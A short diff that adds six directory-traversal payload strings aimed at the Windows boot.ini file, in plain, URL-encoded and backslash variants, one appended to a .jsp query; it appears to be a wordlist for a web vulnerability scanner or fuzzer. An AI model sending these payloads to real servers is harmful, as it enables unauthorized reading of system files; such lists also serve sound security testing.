@@ -1,0 +1,6 @@
+/../../../../../../boot.ini
+../../../../../../boot.ini
+%2f..%2f..%2f..%2f..%2f..%2f..%2fboot.ini
+%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot.ini
+/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini
+/blah.jsp?..\..\..\..\..\..\boot.ini
